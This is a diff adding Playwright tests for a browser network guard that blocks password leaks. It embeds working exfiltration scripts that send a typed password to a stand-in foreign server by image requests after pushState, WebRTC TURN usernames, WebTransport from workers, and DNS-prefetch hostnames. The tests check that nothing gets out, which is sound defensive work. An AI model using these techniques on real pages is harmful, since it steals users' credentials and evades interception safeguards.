@@ -1,7 +1,8 @@
 import { randomBytes } from 'node:crypto'
+import { createSocket } from 'node:dgram'
 import { mkdtempSync } from 'node:fs'
 import { createServer, type Server } from 'node:http'
-import type { AddressInfo } from 'node:net'
+import { createServer as createNetServer, type AddressInfo } from 'node:net'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { Readable } from 'node:stream'
@@ -150,5 +151,139 @@ test('окно того же сайта не уносит пароль: замо
     await context.close()
     site.close()
     foreign.close()
+  }
+})
+
+// Уход без нового документа: адрес страницы меняется, а пароль остаётся в DOM. Замок держится до нового документа.
+for (const [label, leave] of [
+  ['204 и pushState', `location.href = '/nocontent'`],
+  ['stop() и pushState', `location.href = '/slow'; setTimeout(() => window.stop(), 100)`],
+  ['скачивание и pushState', `location.href = '/download'`],
+] as const) {
+  test(`пароль не уходит после ухода без нового документа: ${label}`, async ({ browser }) => {
+    const stolen: string[] = []
+    const foreign = createServer((request, response) => {
+      stolen.push(request.url ?? '')
+      response.writeHead(200, { 'content-type': 'image/gif' })
+      response.end()
+    })
+    const foreignUrl = (await listen(foreign)).replace('127.0.0.1', 'localhost')
+    const leakScript = `
+      document.querySelector('input[type=password]')?.addEventListener('input', (event) => {
+        const value = event.target.value
+        ${leave}
+        setTimeout(() => {
+          history.pushState({}, '', '/moved')
+          new Image().src = '${foreignUrl}/after?p=' + encodeURIComponent(value)
+        }, 1500)
+      })
+    `
+    const site = createServer((request, response) => {
+      if (request.url === '/nocontent') return void response.writeHead(204).end()
+      if (request.url === '/slow') return void setTimeout(() => response.writeHead(200, { 'content-type': 'text/html' }).end('<title>Долго</title>'), 5_000)
+      if (request.url === '/download') return void response.writeHead(200, { 'content-type': 'application/octet-stream', 'content-disposition': 'attachment; filename="x.bin"' }).end('x')
+      response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
+      response.end(`<!doctype html><title>Вход</title><input type="password" name="password"><script>${leakScript}</script>`)
+    })
+    const siteUrl = await listen(site)
+    const context = await browser.newContext({ acceptDownloads: false })
+    const blocked: string[] = []
+    const guard = await installNetworkGuard(context, { allowedOrigins: [siteUrl], allowedMutations: [] }, (request) => blocked.push(request.code))
+    try {
+      const page = await context.newPage()
+      await page.goto(`${siteUrl}/login`)
+      guard.passwordFilled(page)
+      await page.fill('input[type=password]', PASSWORD)
+      await expect.poll(() => blocked.length + stolen.length, { timeout: 10_000 }).toBeGreaterThan(0)
+      expect(stolen).toEqual([])
+      expect(blocked).toContain('refused_leak')
+    } finally {
+      await context.close()
+      site.close()
+      foreign.close()
+    }
+  })
+}
+
+// Каналы мимо перехвата запросов: WebRTC (TURN с паролем в имени пользователя), WebTransport из фонового скрипта,
+// пароль в имени хоста (предварительное соединение). Ни один пакет не должен дойти до чужого сервера.
+test('мимо перехвата пароль не уходит: WebRTC, WebTransport из Worker, имя хоста', async ({ browser }) => {
+  const tcp: string[] = []
+  const tcpServer = createNetServer((socket) => {
+    tcp.push('соединение')
+    socket.on('error', () => {})
+  })
+  await new Promise<void>((resolve) => tcpServer.listen(0, '127.0.0.1', resolve))
+  const tcpPort = (tcpServer.address() as AddressInfo).port
+  const udp: number[] = []
+  const udpServer = createSocket('udp4')
+  udpServer.on('message', (message) => udp.push(message.length))
+  await new Promise<void>((resolve) => udpServer.bind(0, '127.0.0.1', resolve))
+  const udpPort = udpServer.address().port
+  const site = createServer((_request, response) => {
+    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
+    response.end('<!doctype html><title>Вход</title><input type="password" name="password">')
+  })
+  const siteUrl = await listen(site)
+  const context = await browser.newContext()
+  const guard = await installNetworkGuard(context, { allowedOrigins: [siteUrl], allowedMutations: [] }, () => {})
+  try {
+    const page = await context.newPage()
+    await page.goto(siteUrl)
+    guard.passwordFilled(page)
+    await page.fill('input[type=password]', PASSWORD)
+    const tried = await page.evaluate(
+      async ({ tcpPort, udpPort }) => {
+        const value = (document.querySelector('input[type=password]') as HTMLInputElement).value
+        const outcome: Record<string, string> = {}
+        for (const rel of ['preconnect', 'dns-prefetch']) {
+          for (const host of [`${value}.localhost`, '127.0.0.1']) {
+            const link = document.createElement('link')
+            link.rel = rel
+            link.href = `http://${host}:${tcpPort}`
+            document.head.append(link)
+          }
+        }
+        // Чистое окно рядом: в нём свои конструкторы.
+        const frame = document.createElement('iframe')
+        document.body.append(frame)
+        const windows = [window, frame.contentWindow!] as unknown as Array<Record<string, unknown>>
+        for (const [index, scope] of windows.entries()) {
+          for (const transport of ['udp', 'tcp']) {
+            try {
+              const Connection = scope['RTCPeerConnection'] as typeof RTCPeerConnection
+              const connection = new Connection({
+                iceServers: [{ urls: `turn:127.0.0.1:${transport === 'udp' ? udpPort : tcpPort}?transport=${transport}`, username: value, credential: value }],
+                iceTransportPolicy: 'relay',
+              })
+              connection.createDataChannel('leak')
+              await connection.setLocalDescription(await connection.createOffer())
+              outcome[`rtc-${index}-${transport}`] = 'создан'
+            } catch (error) {
+              outcome[`rtc-${index}-${transport}`] = String(error).slice(0, 60)
+            }
+          }
+        }
+        const source = `try { new WebTransport('https://127.0.0.1:${udpPort}/' + ${JSON.stringify(value)}); postMessage('создан') } catch (error) { postMessage(String(error).slice(0, 60)) }`
+        for (const url of [URL.createObjectURL(new Blob([source])), `data:text/javascript,${encodeURIComponent(source)}`]) {
+          const worker = new Worker(url)
+          outcome[`worker-${url.slice(0, 4)}`] = await new Promise<string>((resolve) => {
+            worker.onmessage = (event) => resolve(String(event.data))
+            worker.onerror = () => resolve('ошибка')
+            setTimeout(() => resolve('молчит'), 3_000)
+          })
+        }
+        await new Promise((resolve) => setTimeout(resolve, 2_500))
+        return outcome
+      },
+      { tcpPort, udpPort },
+    )
+    expect(Object.values(tried)).not.toContain('создан')
+    expect({ tcp, udp }).toEqual({ tcp: [], udp: [] })
+  } finally {
+    await context.close()
+    site.close()
+    tcpServer.close()
+    udpServer.close()
   }
 })
